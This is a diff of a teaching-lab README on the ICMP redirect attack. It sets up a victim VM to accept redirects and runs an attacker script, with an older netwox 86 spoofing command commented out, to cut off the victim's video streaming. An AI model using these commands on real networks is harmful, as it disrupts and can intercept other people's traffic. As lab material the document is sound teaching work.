@@ -1,19 +1,36 @@
 ## ICMP Redirect Attack
 
+### Background
+
+ICMP Redirects serve many performance benefits. Read the notes [here](../../notes/icmp/icmp_redirect_benefits.md) to learn the benefits.
+
+But it can also be exploited in attacks, and that is known as the ICMP redirect attack. An ICMP redirect attack involves sending ICMP redirect messages to a victim machine. These messages instruct the victim to use a different gateway (the attacker's machine) for reaching a particular destination.
+
 ### Requirement
 
-In this lab, you will disrupt a victim machine's ICMP traffic using the ICMP redirect attack; and then, using the same attack, you disrupt a victim's video streaming service.
+In this lab, you will use the ICMP redirect attack to disrupt a victim machine's connection to a video streaming service.
 
 ### Setup
 
-2 Linux VMs. VM1 as the victim; VM2 as the attacker. The 2 VMs do not need to be in the same network - however, this lab has only been tested when the two VMs are in the same network. The following is the IP addresses for the VMs used in this README.
+2 Linux VMs. VM1 as the victim; VM3 as the attacker. The 2 VMs reside in the same network. The following is the IP addresses for the VMs used in this README.
 
 | VM  |  IP Address   |   Role   |
 |-----|---------------|----------|
-| VM1 | 172.16.77.128 |  victim  |
-| VM2 | 172.16.77.129 | attacker |
+| VM1 |  10.0.2.4     |  victim  |
+| VM3 |  10.0.2.6     | attacker |
 
 ### Preparation steps:
+
+On the victim VM, run these 2 commands to enable the ICMP redirect feature:
+
+```console
+$ sudo sysctl net.ipv4.conf.all.accept_redirects=1
+$ sudo sysctl net.ipv4.conf.default.accept_redirects=1
+```
+
+Setting these two flags to 1 means that the victim VM accepts ICMP redirects packets, which oftentimes can provide performance benefits - although in this lab, such a feature is taken advantage by the attacker.
+ 
+<!--
 
 This attack only requires one netwox command, let's prepare the command first. This command is: sudo netwox 86 --device "ens33" --filter "src host victim_ip_address" --gw "attacker_ip_address" --src-ip "trusted_gateway_ip_address" --code 1
 
@@ -54,9 +71,11 @@ default via 172.16.77.2 dev ens33 onlink
 
 this command also shows, 172.16.77.2 is VM1's default gateway.
 
+-->
+
 ### Attack steps:
 
-#### Part 1
+<!-- #### Part 1
 
 1. victim, run: 
 
@@ -105,16 +124,38 @@ this time it should fail, thus it proves the attack is successful:
 #### Part 2
 
 the next two steps attempt a new attack which disrupts the victim's video streaming service:
+-->
 
-6: victim, open firefox, watch some youtube video.
+1. victim, opens firefox, watches some youtube video.
 
-7: attacker, run the exact same attack command as before: 
+2. attacker, impersonates the default gateway, keeps sending ICMP redirect packets to the victim which instruct the victim to use a different gateway (the attacker's machine) for reaching its destination.  You can use this script to send the icmp redirect packets: [icmp_redirect](icmp_redirect.py), before you can run the script, change the following 4 lines to match with your settings.
 
 ```console
-$ sudo netwox 86 --device "ens33" --filter "src host 172.16.77.128" --gw "172.16.77.129" --src-ip "172.16.77.2" --code 1
+victim_ip = "10.0.2.4"
+default_gateway_ip = "10.0.2.1"
+attacker_ip = "10.0.2.6"
+iface = "enp0s3"  # replace with your network interface name
 ```
 
-if successful, victim won't be able to watch the youtude video. The following two screenshots show before pressing enter and after pressing enter (to execute the attacking command):
+**Note**: how to find the default gateway ip address in the victim VM and how to find the network interface name? Run this command in the victim VM:
+
+```console
+$ ip route
+default via 10.0.2.1 dev enp0s3 proto dhcp metric 100 
+10.0.2.0/24 dev enp0s3 proto kernel scope link src 10.0.2.4 metric 100 
+169.254.0.0/16 dev enp0s3 scope link metric 1000 
+172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
+```
+
+In the above output, the ip address after the "default via" is the default gateway; here in this example, it is 10.0.2.1; and the string after the "dev" is the network interface name, in this example, it is "enp0s3".
+
+3. run the script in the attacker VM:
+
+```console
+$ sudo python3 icmp_redirect.py
+```
+
+if successful, victim won't be able to watch the youtude video. The following two screenshots show before pressing enter and after pressing enter (to execute the attacking script):
 
 before pressing enter:
 
